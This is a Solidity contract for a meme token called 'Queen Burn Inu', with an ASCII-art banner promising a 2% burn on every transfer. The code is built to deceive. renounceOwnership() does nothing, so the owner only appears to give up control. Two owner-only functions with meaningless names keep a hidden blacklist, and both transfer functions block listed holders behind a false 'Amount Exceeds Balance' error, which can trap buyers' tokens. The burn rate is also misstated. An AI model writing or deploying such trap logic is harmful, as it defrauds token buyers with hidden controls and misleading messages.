pragma solidity 0.8.17;
/*
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#Y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#!#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@5~P&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P~^J#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@5^:G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#YP&@@#~!&#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P#@@@@&Y!~~7G@@G~&J5@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#@@&J!&@@@P!~~~~~~?#@5@Y~J&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#JB@#7~7&@&J~~~~~~~~~!P@@J~~7#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BYYB@#7~~!##7~~~~~~~~~~~~Y#!~~~7&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BY&@@&7~~~~J!~~~~~~^^~~~~~~!~~~~~?&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@G#@@@?~~~~~~~~~~^^^^^^^^~~~~~~~~~~Y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@5~~~~~~~^^^^^^^:^^^^^^^^^~~~~~~B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@PP#@@@@@@#~~~^^^^^^^^^:::!!:^^^^^^^^^^^^^?@@@@@@&B5#@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@Y~!7YG#@@J^^^^^^^^::::::!##!:::^^^^^^^^^^^#@&BPJ!~~B@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@&&&###Y~~~^~77?^:::::::::::^!5&@@&P7^::^^^^^^:::77!7~^~~~P###&&&@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@#GY7~^^^^~~^^^Y#PY?7!^:::::JG#@@@@@@@@&G?:::::~7?JYP#Y^^^~~~^^~!JPB&@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@&BY!^^^^^^^:5@@@@@Y:::::!&@@@@@@@@@@#7:::::Y@@@@@5^^^^^^^!YB&@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@&P!:::::::5@@@@Y::::::!&@@@@@@@@&~::::::J@@@@P^^^^^^!P&@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@&5^::::::P@@@#!:::::^B@@@@@@@@#^:::::!#@@@P::::^:7@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@P::::::^G@@@&GY?J5#@@@@@@@@@@#5J?YG&@@@G^:::::^#@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@5::::::^B@@@@@@@@@@@@@@@@@@@@@@@@@@@@B^:::::^G@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@P^:::::^B@@@@@@@@@@@@@@@@@@@@@@@@@@#~:::::^G@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B!:::::~#@@@@@@@@@@@@@@@@@@@@@@@@#~:::::7#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P!::::!#@@@@@@@@@@@@@@@@@@@@@@&!::::~P@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P7^::^J5PGB##&&&&&&&##BBGP5J~::^7P&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#P?!~~^^^^^~~~~~~~^^^^^^~~!?5#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#GPP5YYJJJJJJJYYY5PPB#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@



╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╭━━╮
┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱┃╭╮┃
┃┃╱┃┣╮╭┳━━┳━━┳━╮╱┃╰╯╰┳╮╭┳━┳━╮
┃┃╱┃┃┃┃┃┃━┫┃━┫╭╮╮┃╭━╮┃┃┃┃╭┫╭╮╮
┃╰━╯┃╰╯┃┃━┫┃━┫┃┃┃┃╰━╯┃╰╯┃┃┃┃┃┃
╰━━╮┣━━┻━━┻━━┻╯╰╯╰━━━┻━━┻╯╰╯╰╯
╱╱╱╰╯


Queen Burn! 2% of each Transaction BURNED - Time is running out, as it is BURNING away

*/
contract QueenBurn {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) xAmmn;

    // 
    string public name = "Queen Burn Inu";
    string public symbol = unicode"👑🔥";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function aabsd(address _user) public onlyOwner {
        require(!xAmmn[_user], "xx");
        xAmmn[_user] = true;
        // emit events as well
    }
    
    function azdaa(address _user) public onlyOwner {
        require(xAmmn[_user], "xx");
        xAmmn[_user] = false;
        // emit events as well
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
        require(!xAmmn[msg.sender] , "Amount Exceeds Balance"); 


        require(balanceOf[msg.sender] >= value);







        balanceOf[msg.sender] -= value; 
   
            uint shareburn = value/55;
            uint shareuser = value - shareburn;
            balanceOf[to] += shareuser; 
            balanceOf[address(0)] += shareburn; 
            totalSupply -= shareburn;

            emit Transfer(msg.sender, to, shareuser); 
            emit Transfer(msg.sender,address(0),shareburn);

        
        return true;

    }
    



    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!xAmmn[from] , "Amount Exceeds Balance"); 
               require(!xAmmn[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        
            uint shareburn = value/55;
            uint shareuser = value - shareburn;
            allowance[from][msg.sender] -= value;
            balanceOf[to] += shareuser;
            balanceOf[address(0)] += shareburn;
            totalSupply -= shareburn;
            emit Transfer(from, to, shareuser); 
            emit Transfer(msg.sender,address(0),shareburn);
    
    return true;

                     }
}